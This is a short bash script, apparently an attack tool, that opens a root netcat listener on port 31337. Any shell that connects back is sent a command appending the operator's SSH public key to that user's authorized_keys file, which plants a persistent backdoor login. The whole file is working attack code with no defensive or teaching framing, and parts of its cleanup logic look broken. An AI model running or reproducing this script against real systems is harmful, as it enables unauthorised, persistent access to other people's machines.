#!/bin/bash

sshkey=$( cat ~/.ssh/id_rsa.pub )

echo "/bin/bash; echo \"${sshkey} \" >> /home/\`whoami | cut -d$'\\n' -f1\`/.ssh/authorized_keys; whoami; exit; exit;" | sudo nc -lvp 31337 > out

tr -d '\n' < out > ssh_name
rm out ssh_name
